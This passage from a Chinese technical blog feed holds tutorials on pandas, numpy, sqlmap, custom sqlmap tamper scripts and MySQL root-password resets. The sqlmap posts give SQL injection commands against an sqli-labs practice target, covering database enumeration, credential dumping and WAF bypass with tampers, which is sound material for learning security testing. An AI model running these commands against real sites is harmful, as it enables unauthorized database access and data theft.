0.535374</span><br></pre></td></tr></table></figure><h2 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h2><p>支持 python/numpy 式的数据选择方式，但推荐使用优化过的pandas的数据访问方法<br>.at, .iat, .loc, .iloc, .ix</p><h3 id="Getting"><a href="#Getting" class="headerlink" title="Getting"></a>Getting</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; df[&apos;A&apos;]</span><br><span class="line">0    2.475818</span><br><span class="line">1   -1.164286</span><br><span class="line">2    0.485655</span><br><span class="line">3    2.361547</span><br><span class="line">4   -2.144984</span><br><span class="line">5    1.324414</span><br><span class="line">Name: A, dtype: float64</span><br><span class="line">#按照行切片</span><br><span class="line">&gt;&gt;&gt; df[0:3]</span><br><span class="line">          A         B         C         D</span><br><span class="line">0  2.475818  0.306987  1.021874 -0.417637</span><br><span class="line">1 -1.164286  0.356116 -0.993138 -0.989995</span><br><span class="line">2  0.485655 -0.838615  1.361994  0.116390</span><br><span class="line">#按照列切片</span><br><span class="line">&gt;&gt;&gt; df.loc[:,[&apos;A&apos;,&apos;B&apos;]]</span><br><span class="line">          A         B</span><br><span class="line">0  2.475818  0.306987</span><br><span class="line">1 -1.164286  0.356116</span><br><span class="line">2  0.485655 -0.838615</span><br><span class="line">3  2.361547  0.677815</span><br><span class="line">4 -2.144984  0.462015</span><br><span class="line">5  1.324414  1.001327</span><br><span class="line">#行列组合切片</span><br><span class="line">&gt;&gt;&gt; df.loc[1:3,[&apos;B&apos;,&apos;C&apos;]]</span><br><span class="line">          B         C</span><br><span class="line">1  0.356116 -0.993138</span><br><span class="line">2 -0.838615  1.361994</span><br><span class="line">3  0.677815  0.111376</span><br><span class="line">#访问单独某个元素</span><br><span class="line">&gt;&gt;&gt; df.at[2,&apos;A&apos;]</span><br><span class="line">0.48565490462353172</span><br><span class="line">#通过位置整数</span><br><span class="line">&gt;&gt;&gt; df.iloc[2]</span><br><span class="line">A    0.485655</span><br><span class="line">B   -0.838615</span><br><span class="line">C    1.361994</span><br><span class="line">D    0.116390</span><br><span class="line">&gt;&gt;&gt; df.iloc[2,3]</span><br><span class="line">0.11638981174576087</span><br><span class="line">#通过位置整数切片</span><br><span class="line">&gt;&gt;&gt; df.iloc[0:2,0:3]</span><br><span class="line">          A         B         C</span><br><span class="line">0  2.475818  0.306987  1.021874</span><br><span class="line">1 -1.164286  0.356116 -0.993138</span><br><span class="line">#通过整数列表切片</span><br><span class="line">          A         C</span><br><span class="line">1 -1.164286 -0.993138</span><br><span class="line">2  0.485655  1.361994</span><br><span class="line">4 -2.144984  0.495043</span><br><span class="line">#通过条件选择</span><br><span class="line">&gt;&gt;&gt; df[df.A&gt;0]</span><br><span class="line">          A         B         C         D</span><br><span class="line">0  2.475818  0.306987  1.021874 -0.417637</span><br><span class="line">2  0.485655 -0.838615  1.361994  0.116390</span><br><span class="line">3  2.361547  0.677815  0.111376  0.625714</span><br><span class="line">5  1.324414  1.001327  1.014735  0.535374</span><br><span class="line">#类似where语句</span><br><span class="line">&gt;&gt;&gt; df[df[&apos;A&apos;]==2.361547]</span><br><span class="line">          A         B         C         D</span><br><span class="line">3  2.361547  0.677815  0.111376  0.625714</span><br></pre></td></tr></table></figure><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h2 id="重置DataFrame的index，从0开始"><a href="#重置DataFrame的index，从0开始" class="headerlink" title="重置DataFrame的index，从0开始"></a>重置DataFrame的index，从0开始</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">train_df = train_df.reset_index(drop=True)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python numpy基础使用</title>
      <link href="//blog/2017/python-numpy%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.html"/>
      <url>//blog/2017/python-numpy%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<h1 id="numpy是什么"><a href="#numpy是什么" class="headerlink" title="numpy是什么"></a>numpy是什么</h1><p>numpy是python的一种开源的数值计算拓展包。提供矩阵计算，具有比python自带的列表结构更高的性能。</p><h1 id="numpy怎么用"><a href="#numpy怎么用" class="headerlink" title="numpy怎么用"></a>numpy怎么用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br></pre></td></tr></table></figure><h1 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h1><ol><li><p>array创建数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.array([1,2,3,4])</span><br></pre></td></tr></table></figure></li><li><p>创建一个未初始化数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.empty(shape=[3,4])</span><br></pre></td></tr></table></figure></li><li><p>创建某条斜线为1其他为0的矩阵</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.eye(10)</span><br><span class="line">#</span><br><span class="line">np.eye(4,5,k=-1)</span><br></pre></td></tr></table></figure></li><li><p>创建单位矩阵</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.identity(5)</span><br></pre></td></tr></table></figure></li><li><p>创建全1数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.ones(3)</span><br><span class="line">#</span><br><span class="line">np.ones((3,5))</span><br></pre></td></tr></table></figure></li><li><p>创建全0数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.zeros(3)</span><br><span class="line">#</span><br><span class="line">np.zeros((3,5))</span><br></pre></td></tr></table></figure></li><li><p>创建全部为某值的矩阵</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.full(3,666)</span><br><span class="line">#</span><br><span class="line">np.full((3,5),666)</span><br></pre></td></tr></table></figure></li><li><p>创建随机数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.random((3,4))</span><br></pre></td></tr></table></figure></li></ol><h1 id="索引、切片、赋值"><a href="#索引、切片、赋值" class="headerlink" title="索引、切片、赋值"></a>索引、切片、赋值</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = np.array(range(12)).reshape(3,4)</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">array([[ 0,  1,  2,  3],</span><br><span class="line">       [ 4,  5,  6,  7],</span><br><span class="line">       [ 8,  9, 10, 11]])</span><br><span class="line">&gt;&gt;&gt; a[1]</span><br><span class="line">array([4, 5, 6, 7])</span><br><span class="line">&gt;&gt;&gt; a[1,]</span><br><span class="line">array([4, 5, 6, 7])</span><br><span class="line">&gt;&gt;&gt; a[1,1:3]</span><br><span class="line">array([5, 6])</span><br><span class="line">&gt;&gt;&gt; a[1,] = [12,13,14,15]</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">array([[ 0,  1,  2,  3],</span><br><span class="line">       [12, 13, 14, 15],</span><br><span class="line">       [ 8,  9, 10, 11]])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> numpy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqlmap使用总结</title>
      <link href="//blog/2017/sqlmap%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
      <url>//blog/2017/sqlmap%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap是全面的注入工具"><a href="#sqlmap是全面的注入工具" class="headerlink" title="sqlmap是全面的注入工具"></a>sqlmap是全面的注入工具</h1><h2 id="最简单形式"><a href="#最简单形式" class="headerlink" title="最简单形式"></a>最简单形式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>Get </span><br><span class="line">python27 sqlmap.py -u "http://hack.com/sqli-labs/Less-1/?id=1" --batch</span><br><span class="line"><span class="meta">#</span>爆数据库</span><br><span class="line">python27 sqlmap.py -u "http://hack.com/sqli-labs/Less-1/?id=1" --dbs</span><br><span class="line"><span class="meta">#</span>爆表名</span><br><span class="line">python27 sqlmap.py -u "http://hack.com/sqli-labs/Less-1/?id=1" -D security --tables</span><br><span class="line"><span class="meta">#</span>爆列名</span><br><span class="line">python27 sqlmap.py -u "http://hack.com/sqli-labs/Less-1/?id=1" -D security -T users --columns</span><br><span class="line"><span class="meta">#</span>dump数据</span><br><span class="line">python27 sqlmap.py -u "http://hack.com/sqli-labs/Less-1/?id=1" -D security -T users -C id,username,password --dump</span><br></pre></td></tr></table></figure><h2 id="post，cookies"><a href="#post，cookies" class="headerlink" title="post，cookies"></a>post，cookies</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -u "http://hack.com/sqli-labs/Less-11/" --data="uname=admin&amp;passwd=admin&amp;submit=Submit" --cookie="XIc6_2132_saltkey=g5N5rRBz; SESS2a7db910cd5249ca3016afc519d2d9bf=OFwfZCCwgO8XF5bYygJsUNy__-kwXuDVk2birG42BVA" --batch</span><br></pre></td></tr></table></figure><h2 id="从文件中读取"><a href="#从文件中读取" class="headerlink" title="从文件中读取"></a>从文件中读取</h2><p>最好用，(可以burpsuite抓包，保存到文件中如:in.txt)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -r in.txt --batch</span><br></pre></td></tr></table></figure></p><h2 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h2><p>指定存在漏洞的参数，适合猜测或者手动分析过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -u &quot;http://hack.com/sqli-labs/Less-11/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; -p passwd --batch</span><br></pre></td></tr></table></figure></p><h2 id="指定注入的方式"><a href="#指定注入的方式" class="headerlink" title="指定注入的方式"></a>指定注入的方式</h2><p>适合手动测试过，特别是sqlmap会优先用time-based而不是union select<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -u &quot;http://hack.com/sqli-labs/Less-1/?id=1&quot; --technique U --batch --dbs</span><br><span class="line">#B, E, Q, S, T, U</span><br></pre></td></tr></table></figure></p><h2 id="指定注入位置"><a href="#指定注入位置" class="headerlink" title="指定注入位置"></a>指定注入位置</h2><p>“*“号指定注入的指定位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -u &quot;http://hack.com/sqli-labs/Less-1/?id=1*+--+&quot; --batch</span><br></pre></td></tr></table></figure></p><h2 id="tamper绕过waf"><a href="#tamper绕过waf" class="headerlink" title="tamper绕过waf"></a>tamper绕过waf</h2><p>tamper绕过waf，可以尝试使用不同的tamper来绕过waf，保存在tamper目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 sqlmap.py -u &quot;http://hack.com/sqli-labs/Less-1/?id=1&quot; --tamper=space2comment --batch</span><br></pre></td></tr></table></figure></p><h2 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h2><p>可以直接sqlmap -h 或者 sqlmap -hh查看下，有需要可以尝试下</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>为sqlmap编写tamper达到Bypass</title>
      <link href="//blog/2017/%E4%B8%BAsqlmap%E7%BC%96%E5%86%99tamper%E8%BE%BE%E5%88%B0Bypass.html"/>
      <url>//blog/2017/%E4%B8%BAsqlmap%E7%BC%96%E5%86%99tamper%E8%BE%BE%E5%88%B0Bypass.html</url>
      
        <content type="html"><![CDATA[<h1 id="自定义tamper来bypass"><a href="#自定义tamper来bypass" class="headerlink" title="自定义tamper来bypass"></a>自定义tamper来bypass</h1><p>主要是实现其中的tamper函数，该函数会在发出请求前调用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure></p><p>sqlmap自带有以下tamper<br><img src="http://www.91ri.org/7852.html" alt="Sqlmap Tamper大全"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py </span><br><span class="line">原理：用utf8代替单引号</span><br><span class="line">作用：</span><br><span class="line">apostrophenullencode.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">appendnullbyte.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">base64encode.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">between.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">bluecoat.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">chardoubleencode.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">charencode.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">charunicodeencode.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">commalesslimit.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">commalessmid.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">commentbeforeparentheses.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">concat2concatws.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">equaltolike.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">escapequotes.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">greatest.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">halfversionedmorekeywords.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">htmlencode.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">ifnull2ifisnull.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">informationschemacomment.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">lowercase.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">modsecurityversioned.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">modsecurityzeroversioned.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">multiplespaces.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">nonrecursivereplacement.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">overlongutf8.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">percentage.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">plus2concat.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">plus2fnconcat.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">randomcase.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">randomcomments.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">securesphere.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2comment.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2dash.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2hash.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2morecomment.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2morehash.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2mssqlblank.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2mssqlhash.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2mysqlblank.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2mysqldash.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2plus.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">space2randomblank.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">sp_password.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">symboliclogical.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">unionalltounion.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">unmagicquotes.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">uppercase.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">varnish.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">versionedkeywords.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">versionedmorekeywords.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br><span class="line">xforwardedfor.py</span><br><span class="line">原理：</span><br><span class="line">作用：</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql使用总结</title>
      <link href="//blog/2017/mysql%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
      <url>//blog/2017/mysql%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL密码的恢复方法之一"><a href="#MySQL密码的恢复方法之一" class="headerlink" title="MySQL密码的恢复方法之一"></a>MySQL密码的恢复方法之一</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1．首先确认服务器出于安全的状态，也就是没有人能够任意地连接MySQL数据库。 因为在重新设置MySQL的root密码的期间，MySQL数据库完全出于没有密码保护的 状态下，其他的用户也可以任意地登录和修改MySQL的信息。可以采用将MySQL对外的端口封闭，并且停止Apache以及所有的用户进程的方法实现服务器的准安全状态。最安全的状态是到服务器的Console上面操作，并且拔掉网线。</span><br><span class="line">2．修改MySQL的登录设置： </span><br><span class="line"># vi /etc/my.cnf </span><br><span class="line">在[mysqld]的段中加上一句：skip-grant-tables 保存并且退出vi。</span><br><span class="line">3．重新启动mysqld </span><br><span class="line"># /etc/init.d/mysqld restart ( service mysqld restart )</span><br><span class="line">4．登录并修改MySQL的root密码</span><br><span class="line">mysql&gt; USE mysql ; </span><br><span class="line">mysql&gt; UPDATE user SET Password = password ( &apos;new-password&apos; ) WHERE User = &apos;root&apos; ; </span><br><span class="line">###</span><br><span class="line">mysql5.7中</span><br><span class="line">update mysql.user set authentication_string=PASSWORD(&apos;qq123456&apos;) where User=&apos;root&apos;;</span><br><span class="line">###</span><br><span class="line">mysql&gt; flush privileges ; </span><br><span class="line">mysql&gt; quit</span><br><span class="line">5．将MySQL的登录设置修改回来 </span><br><span class="line"># vi /etc/my.cnf </span><br><span class="line">将刚才在[mysqld]的段中加上的skip-grant-tables删除 </span><br><span class="line">保存并且退出vi。</span><br><span class="line">6．重新启动mysqld </span><br><span class="line"># /etc/init.d/mysqld restart  ( service mysqld restart )</span><br><span class="line">7．恢复服务器的正常工作状态</span><br><span class="line">将步骤一中的操作逆向操作。恢复服务器的工作状态。</span><br></pre></td></tr></table></figure><h2 id="MySQL密码的恢复方法之二"><a href="#MySQL密码的恢复方法之二" class="headerlink" title="MySQL密码的恢复方法之二"></a>MySQL密码的恢复方法之二</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">如果忘记了MySQL的root密码，可以用以下方法重新设置：</span><br><span class="line">1. KILL掉系统里的MySQL进程； </span><br><span class="line">killall -TERM mysqld</span><br><span class="line">2. 用以下命令启动MySQL，以不检查权限的方式启动； </span><br><span class="line">safe_mysqld --skip-grant-tables &amp;</span><br><span class="line">3. 然后用空密码方式使用root用户登录 MySQL； </span><br><span class="line">mysql -u root</span><br><span class="line">4. 修改root用户的密码； </span><br><span class="line">mysql&gt; update mysql.user set password=PASSWORD(&apos;新密码&apos;) where User=&apos;root&apos;; </span><br><span class="line">###</span><br><span class="line">mysql5.7中</span><br><span class="line">update mysql.user set authentication_string=PASSWORD(&apos;qq123456&apos;) where User=&apos;root&apos;;</span><br><span class="line">###</span><br><span class="line">mysql&gt; flush privileges; </span><br><span class="line">mysql&gt; quit </span><br><span class="line">重新启动MySQL，就可以使用新密码登录了</span><br></pre></td></tr></table></figure><h2 id="MySQL密码的恢复方法三"><a href="#MySQL密码的恢复方法三" class="headerlink" title="MySQL密码的恢复方法三"></a>MySQL密码的恢复方法三</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">有可能你的系统没有 safe_mysqld 程序(比如我现在用的 ubuntu操作系统, apt-get安装的mysql) , 下面方法可以恢复</span><br><span class="line">1. 停止mysqld； </span><br><span class="line">/etc/init.d/mysql stop</span><br><span class="line">(您可能有其它的方法,总之停止mysqld的运行就可以了)</span><br><span class="line">2. 用以下命令启动MySQL，以不检查权限的方式启动； </span><br><span class="line">mysqld --skip-grant-tables &amp;</span><br><span class="line">3. 然后用空密码方式使用root用户登录 MySQL； </span><br><span class="line">mysql -u root</span><br><span class="line">4. 修改root用户的密码； </span><br><span class="line">mysql&gt; update mysql.user set 